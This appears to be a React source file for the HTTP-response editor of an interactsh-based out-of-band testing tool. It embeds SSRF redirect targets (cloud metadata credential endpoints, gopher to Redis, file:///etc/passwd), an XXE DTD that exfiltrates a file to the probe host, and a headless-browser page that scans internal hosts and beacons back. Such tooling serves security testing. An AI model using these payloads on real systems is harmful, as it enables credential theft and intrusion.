// The HTTP response tab: how this probe answers HTTP and HTTPS hits (phase 2, answered by the edge).
// The preview comes from the server, which runs the same code as the edge.
import { useEffect, useMemo, useState, type ReactNode } from "react";
import { ChevronLeft, ChevronRight, Plus, X } from "lucide-react";
import { useApp, fetchRule, previewRule, saveRule, setRuleDirty, takeRuleSeed } from "@/store";
import type { HttpRule, Probe, RuleMode, RuleState, RuleVersion } from "@/lib/types";
import { dayOrTime, plural } from "@/lib/format";
import { toast } from "@/lib/toast";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { cn } from "@/lib/utils";

const DEFAULT: HttpRule = { mode: "default", delayMs: 0, schemes: { http: true, https: true } };
const MODE_DEFAULTS: Record<RuleMode, Partial<HttpRule>> = {
  default: {},
  redirect: { status: 302, location: "", loop: 0 },
  custom: { status: 200, headers: [], body: "", bodyEncoding: "text" },
  file: { contentType: "text/plain; charset=utf-8", body: "", bodyEncoding: "text", template: "" },
};
const MODES: [RuleMode, string][] = [["default", "Default reply"], ["redirect", "Redirect"], ["custom", "Custom response"], ["file", "Hosted file"]];

// Redirect targets that work without extra request headers (a redirect can't add them).
const TARGETS: [string, string][] = [
  ["AWS IMDSv1: IAM credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
  ["AWS ECS task metadata", "http://169.254.170.2/v2/metadata"],
  ["Alibaba Cloud metadata", "http://100.100.100.200/latest/meta-data/"],
  ["DigitalOcean metadata", "http://169.254.169.254/metadata/v1.json"],
  ["Oracle Cloud IMDSv1", "http://169.254.169.254/opc/v1/instance/"],
  ["Localhost web", "http://127.0.0.1/"],
  ["Redis via gopher (INFO)", "gopher://127.0.0.1:6379/_INFO%0D%0A"],
  ["Memcached via dict (stats)", "dict://127.0.0.1:11211/stats"],
  ["Local file", "file:///etc/passwd"],
];

function templates(tag: string, host: string): Record<string, { label: string; contentType: string; body: string }> {
  const back = `https://${host}/${tag}`;
  return {
    "xxe-dtd": {
      label: "XXE: external DTD (out-of-band read)",
      contentType: "application/xml-dtd",
      body: `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${tag}.${host}/x?d=%file;'>">\n%eval;\n%exfil;\n`,
    },
    "headless-page": {
      label: "HTML: probe page for headless browsers and PDF renderers",
      contentType: "text/html; charset=utf-8",
      body: `<!doctype html><title>.</title>\n<script>\nconst back = "${back}/beacon";\nnew Image().src = back + "?ua=" + encodeURIComponent(navigator.userAgent) + "&at=" + encodeURIComponent(location.href);\nfor (const t of ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/"])\n  fetch(t, { mode: "no-cors" }).then(() => new Image().src = back + "?up=" + encodeURIComponent(t), () => new Image().src = back + "?down=" + encodeURIComponent(t));\n</script>\n`,
    },
    svg: {
      label: "SVG: external image fetch",
      contentType: "image/svg+xml",
      body: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1"><image xlink:href="${back}/svg-image" width="1" height="1"/></svg>\n`,
    },
    jwks: { label: "JWKS: empty key set", contentType: "application/json", body: `{"keys":[]}\n` },
  };
}

const norm = (r: HttpRule): HttpRule => (r.mode === "default" ? DEFAULT : { ...DEFAULT, ...MODE_DEFAULTS[r.mode], ...r });
const fld = "flex h-[30px] min-w-0 items-center gap-2 rounded-[3px] border border-rule bg-well px-2.5 font-mono text-[12.5px] text-bone transition-colors focus-within:border-smoke";
const inputCls = "min-w-0 flex-1 bg-transparent outline-none placeholder:text-ash";
const seg = "h-[26px] rounded-none border-l border-rule px-[11px] text-[12px] text-smoke first:border-l-0 data-[state=on]:bg-soot-2 data-[state=on]:font-semibold data-[state=on]:text-bone";

const Row = ({ label, children, help }: { label: string; children: ReactNode; help?: ReactNode }) => (
  <>
    <dt className="pt-[5px] text-[12.5px] font-[550] text-smoke">{label}</dt>
    <dd className="flex min-w-0 flex-col gap-1.5">
      {children}
      {help && <p className="max-w-[64ch] text-[11.5px] leading-4 text-ash">{help}</p>}
    </dd>
  </>
);

function Seg<T extends string>({ value, onChange, items, label, mono }: { value: T; onChange: (v: T) => void; items: [T, string][]; label: string; mono?: boolean }) {
  return (
    <ToggleGroup type="single" value={value} onValueChange={(v) => v && onChange(v as T)} aria-label={label}
      className="w-fit overflow-hidden rounded-[3px] border border-rule" style={{ ["--gap" as string]: 0 }}>
      {items.map(([v, l]) => <ToggleGroupItem key={v} value={v} className={cn(seg, mono && "px-2.5 font-mono")}>{l}</ToggleGroupItem>)}
    </ToggleGroup>
  );
}

function Num({ value, onChange, label, max, w = "w-[64px]" }: { value: number; onChange: (n: number) => void; label: string; max: number; w?: string }) {
  return (
    <label className={cn(fld, w)}>
      <input inputMode="numeric" aria-label={label} value={String(value)} className={cn(inputCls, "text-right")}
        onChange={(e) => { const n = Number(e.target.value.replace(/\D/g, "").slice(0, 6) || 0); onChange(Math.min(n, max)); }} />
    </label>
  );
}

export function HttpRuleTab({ p }: { p: Probe }) {
  const host = useApp((s) => s.status?.payload?.host) || "<id>.oob.example";
  const edge = useApp((s) => s.status?.edge);
  const [rs, setRs] = useState<RuleState | null>(null);
  const [loadErr, setLoadErr] = useState<string | null>(null);
  const [draft, setDraft] = useState<HttpRule>(DEFAULT);
  const [scheme, setScheme] = useState<"http" | "https">("http");
  const [hop, setHop] = useState(1);
  const [preview, setPreview] = useState<{ raw?: string; error?: string; delayMs?: number }>({});
  const [saving, setSaving] = useState(false);

  // load this probe's rule; a new active version (saved elsewhere) replaces an untouched draft
  const activeVersion = p.httpRule?.version ?? 0;
  useEffect(() => {
    let live = true;
    fetchRule(p.tag).then((r) => {
      if (!live) return;
      setRs(r); setLoadErr(null); setHop(1);
      const seed = r.active ? null : takeRuleSeed(p.tag); // planted as Redirect / Hosted file
      setDraft(norm(seed ? { ...DEFAULT, ...MODE_DEFAULTS[seed], mode: seed } : r.active?.rule ?? DEFAULT));
    },
      (e) => live && setLoadErr((e as Error).message));
    return () => { live = false; };
  }, [p.tag, activeVersion]);

  const base = useMemo(() => norm(rs?.active?.rule ?? DEFAULT), [rs]);
  const dirty = rs != null && JSON.stringify(draft) !== JSON.stringify(base);
  useEffect(() => { setRuleDirty(dirty ? p.tag : null); }, [dirty, p.tag]);
  useEffect(() => () => setRuleDirty(null), []);

  // preview the exact next answer (debounced; the server validates)
  useEffect(() => {
    const t = setTimeout(() => {
      previewRule(p.tag, draft, scheme, hop).then((r) => setPreview(r.error ? { error: r.error } : r), (e) => setPreview({ error: (e as Error).message }));
    }, 220);
    return () => clearTimeout(t);
  }, [p.tag, draft, scheme, hop]);

  const set = (patch: Partial<HttpRule>) => setDraft((d) => ({ ...d, ...patch }));
  const setMode = (mode: RuleMode) => { setDraft((d) => norm({ ...DEFAULT, ...(mode === d.mode ? d : MODE_DEFAULTS[mode]), mode, delayMs: d.delayMs, schemes: d.schemes })); setHop(1); };
  const nextVersion = (rs?.history[0]?.version ?? 0) + 1;
  const save = async () => {
    setSaving(true);
    try {
      const r = await saveRule(p.tag, draft);
      setRs(r); setDraft(norm(r.active?.rule ?? DEFAULT));
      toast(edge?.state === "running" ? `Saved ${p.tag} v${r.active?.version}: the next hit gets it` : `Saved ${p.tag} v${r.active?.version}. The edge isn't live yet, so the internet still gets interactsh's reply.`);
    } catch (e) { toast((e as Error).message, true); } finally { setSaving(false); }
  };

  if (loadErr) return <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="px-6 py-[18px] text-[12.5px] text-bad">Couldn't load this probe's rule: {loadErr}</div>;
  const tpl = templates(p.tag, host);
  const loop = draft.mode === "redirect" ? draft.loop ?? 0 : 0;
  const hops = loop ? loop + 1 : 1;

  return (
    <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="relative grid min-h-0 grid-cols-[minmax(0,1fr)_400px] content-start gap-x-7 overflow-auto px-6 pt-[18px] max-[1180px]:grid-cols-1 max-[820px]:px-3.5">
      {edge?.state !== "running" && (
        <p className="col-span-full mb-4 rounded-[3px] border border-[#6b5126] bg-[#2b2113] px-3 py-2 text-[12px] leading-[18px] text-[#f3d9a4]">
          <b className="font-semibold">The edge isn't in front of interactsh yet.</b> Rules save and preview here, but the internet still gets interactsh's default reply until the operator runs <code className="font-mono">deploy/cutover-phase2.sh</code>.
        </p>
      )}
      <dl className="m-0 grid grid-cols-[96px_minmax(0,1fr)] content-start gap-x-[18px] gap-y-4 pb-4 max-[820px]:grid-cols-1 max-[820px]:gap-y-1.5">
        <Row label="Answer with" help={draft.mode === "default" ? "interactsh's standard reply: 200, CORS headers, the id reversed in the body. Answered by Colluder, so the hit records exactly what was sent." : "For HTTP and HTTPS hits on this probe. DNS lookups still get interactsh's answer."}>
          <Seg label="Answer with" value={draft.mode} onChange={setMode} items={MODES} />
        </Row>

        {draft.mode === "redirect" && (
          <>
            <Row label="Status" help="302 and 303 usually turn a POST into a GET; 307 and 308 keep the method and body.">
              <Seg label="Redirect status" mono value={String(draft.status)} onChange={(v) => set({ status: Number(v) })} items={["301", "302", "303", "307", "308"].map((s) => [s, s])} />
            </Row>
            <Row label="Location" help="Scheme switches (gopher, dict, file) only land if the client follows them. Cloud targets listed here need no extra request headers.">
              <div className="flex min-w-0 gap-2">
                <label className={cn(fld, "flex-1")}><input aria-label="Location" spellCheck={false} value={draft.location ?? ""} placeholder="http://169.254.169.254/latest/meta-data/" className={inputCls} onChange={(e) => set({ location: e.target.value })} /></label>
                <Select value="" onValueChange={(v) => set({ location: v })}>
                  <SelectTrigger aria-label="Pick a target" className="h-[30px] w-auto gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-[12.5px] font-[550]"><SelectValue placeholder="Targets" /></SelectTrigger>
                  <SelectContent>{TARGETS.map(([l, u]) => <SelectItem key={u} value={u}>{l}</SelectItem>)}</SelectContent>
                </Select>
              </div>
            </Row>
            <Row label="Loop first" help={<>A blind SSRF that follows redirects shows up as a run of hits, <b className="font-[550] text-smoke">hop=1</b> to <b className="font-[550] text-smoke">hop={loop + 1}</b>. One that doesn't follow stops at hop 1. Each hop keeps the scheme it arrived on.</>}>
              <div className="flex items-center gap-2">
                <Switch aria-label="Loop through this probe first" checked={loop > 0} onCheckedChange={(on) => { set({ loop: on ? 9 : 0 }); setHop(1); }} />
                {loop > 0 && <><Num label="Hops" value={loop} max={20} onChange={(n) => { set({ loop: Math.max(n, 1) }); setHop(1); }} /><span className="text-[12.5px] text-smoke">hops through this probe first</span></>}
              </div>
            </Row>
          </>
        )}

        {draft.mode === "custom" && (
          <>
            <Row label="Status"><Num label="Status" value={draft.status ?? 200} max={599} onChange={(n) => set({ status: n })} /></Row>
            <Row label="Headers" help="Content-Length is computed and Connection is always close. Server stays oob.example unless you set one.">
              {(draft.headers ?? []).map(([n, v], i) => (
                <div key={i} className="flex gap-2">
                  <label className={cn(fld, "w-[180px]")}><input aria-label={`Header ${i + 1} name`} spellCheck={false} value={n} placeholder="Name" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [e.target.value, h[1]] : h)) })} /></label>
                  <label className={cn(fld, "flex-1")}><input aria-label={`Header ${i + 1} value`} spellCheck={false} value={v} placeholder="Value" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [h[0], e.target.value] : h)) })} /></label>
                  <Button variant="ghost" size="icon-sm" aria-label={`Remove header ${n || i + 1}`} onClick={() => set({ headers: (draft.headers ?? []).filter((_, j) => j !== i) })}><X /></Button>
                </div>
              ))}
              <Button variant="ghost" size="sm" className="w-fit" disabled={(draft.headers ?? []).length >= 30} onClick={() => set({ headers: [...(draft.headers ?? []), ["", ""]] })}><Plus />Add header</Button>
            </Row>
          </>
        )}

        {draft.mode === "file" && (
          <>
            <Row label="Template" help="Fills the type and body with this probe's own payload host, so fetches it causes come back here as hits.">
              <Select value={draft.template || ""} onValueChange={(v) => set({ template: v, contentType: tpl[v].contentType, body: tpl[v].body, bodyEncoding: "text" })}>
                <SelectTrigger aria-label="Template" className="h-[30px] w-fit min-w-[280px] gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-[12.5px]"><SelectValue placeholder="Start from a template" /></SelectTrigger>
                <SelectContent>{Object.entries(tpl).map(([k, t]) => <SelectItem key={k} value={k}>{t.label}</SelectItem>)}</SelectContent>
              </Select>
            </Row>
            <Row label="Content type"><label className={fld}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
          </>
        )}

        {(draft.mode === "custom" || draft.mode === "file") && (
          <Row label="Body" help={`Up to 256 KB. ${draft.bodyEncoding === "base64" ? "Base64 is decoded before sending, for binary bodies." : "Sent as UTF-8."}`}>
            <textarea aria-label="Body" spellCheck={false} rows={8} value={draft.body ?? ""} onChange={(e) => set({ body: e.target.value })}
              className="min-h-[120px] w-full resize-y rounded-[3px] border border-rule bg-well px-2.5 py-2 font-mono text-[12.5px] leading-[18px] text-bone outline-none focus:border-smoke" />
            <Seg label="Body encoding" value={draft.bodyEncoding ?? "text"} onChange={(v) => set({ bodyEncoding: v })} items={[["text", "Text"], ["base64", "Base64"]]} />
          </Row>
        )}

        {draft.mode !== "default" && (
          <>
            <Row label="Delay" help="Hold the answer to probe timeouts, up to 60 s.">
              <div className="flex items-center gap-2"><Num label="Delay in milliseconds" value={draft.delayMs} max={60000} w="w-[84px]" onChange={(n) => set({ delayMs: n })} /><span className="text-[12.5px] text-smoke">ms before answering</span></div>
            </Row>
            <Row label="Applies to" help="A scheme that's off gets the default reply.">
              <div className="flex items-center gap-4 text-[12.5px]">
                {(["http", "https"] as const).map((k) => (
                  <label key={k} className="flex cursor-pointer items-center gap-[7px]">
                    <input type="checkbox" className="size-3.5 accent-bone" checked={draft.schemes[k]} onChange={(e) => set({ schemes: { ...draft.schemes, [k]: e.target.checked } })} />{k.toUpperCase()}
                  </label>
                ))}
                <span className="text-smoke">any path under the probe</span>
              </div>
            </Row>
          </>
        )}
      </dl>

      <aside className="flex min-w-0 flex-col gap-3.5 pb-4" aria-label="Preview and history">
        <div className="flex flex-col rounded-[3px] border border-rule-2 bg-well">
          <div className="flex h-8 items-center gap-2 border-b border-rule-2 pr-1.5 pl-3 text-[12.5px] font-[650]">
            Next answer
            <span className="truncate text-[11px] font-normal text-ash">{loop ? `hop ${hop} of ${hops}` : scheme.toUpperCase()}{dirty ? ", with your unsaved changes" : ""}{preview.delayMs ? `, after ${preview.delayMs} ms` : ""}</span>
            <span className="ml-auto flex items-center gap-0.5">
              <Seg label="Preview scheme" value={scheme} onChange={setScheme} items={[["http", "HTTP"], ["https", "HTTPS"]]} />
              {loop > 0 && <>
                <Button variant="ghost" size="icon-sm" aria-label="Previous hop" disabled={hop <= 1} onClick={() => setHop(hop - 1)}><ChevronLeft /></Button>
                <Button variant="ghost" size="icon-sm" aria-label="Next hop" disabled={hop >= hops} onClick={() => setHop(hop + 1)}><ChevronRight /></Button>
              </>}
            </span>
          </div>
          {preview.error
            ? <p className="px-3 py-2.5 text-[12.5px] text-bad">Can't answer like this yet: {preview.error}</p>
            : <pre className="m-0 max-h-[260px] overflow-auto px-3 py-2 font-mono text-[12.5px] leading-[18px] break-all whitespace-pre-wrap text-bone">{preview.raw ?? " "}</pre>}
        </div>

        <div className="rounded-[3px] border border-rule bg-soot">
          <div className="flex h-7 items-center gap-2 border-b border-rule-2 px-3 text-[12.5px] font-[650]">Rule history<span className="truncate text-[11px] font-normal text-ash">each hit records the version that answered it</span></div>
          <ol className="m-0 list-none py-1">
            {(rs?.history ?? []).map((v) => <HistoryRow key={v.version} v={v} current={v.version === rs?.active?.version} onLoad={() => { setDraft(norm(v.rule)); setHop(1); }} />)}
            <li className="grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-[12.5px]">
              <span /><span /><span className="truncate text-smoke">Default reply (no rule)</span>
              <span className="text-[11.5px] text-ash">answered {plural(rs?.defaultHits ?? 0, "hit")}</span>
            </li>
          </ol>
        </div>
      </aside>

      <div className="sticky bottom-0 col-span-full flex flex-wrap items-center gap-2 border-t border-rule-2 bg-soot py-3">
        {dirty && <span className="mr-1 flex items-center gap-1.5 text-[12px] text-smoke"><i className="inline-block size-1.5 rounded-full border-[1.5px] border-smoke" />Unsaved changes</span>}
        <Button disabled={!dirty || saving || !!preview.error} onClick={save}>Save as v{nextVersion}</Button>
        <Button variant="quiet" disabled={!dirty || saving} onClick={() => { setDraft(base); setHop(1); }}>Discard</Button>
        <span className="ml-2 text-[11.5px] text-ash">Saved rules answer the next hit. Earlier hits keep the answer they got.</span>
      </div>
    </div>
  );
}

function HistoryRow({ v, current, onLoad }: { v: RuleVersion; current: boolean; onLoad: () => void }) {
  const r = v.rule;
  const what = r.mode === "default" ? "Default reply" : r.mode === "redirect" ? `Redirect ${r.status} → ${r.location}${r.loop ? `, loop ×${r.loop}` : ""}`
    : r.mode === "file" ? `Hosted file, ${r.contentType}` : `Custom ${r.status}`;
  return (
    <li className={cn("grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-[12.5px]", current && "bg-soot-2")}>
      <span className="text-[11.5px] text-smoke">v{v.version}</span>
      <span className="font-semibold">{dayOrTime(v.createdAt)}</span>
      <button type="button" className="cursor-pointer truncate text-left text-smoke hover:text-bone" title={`Load v${v.version} into the editor`} onClick={onLoad}>{what}</button>
      <span className="text-[11.5px] whitespace-nowrap text-ash">{current ? "active · " : ""}answered {plural(v.hits ?? 0, "hit")}</span>
    </li>
  );
}
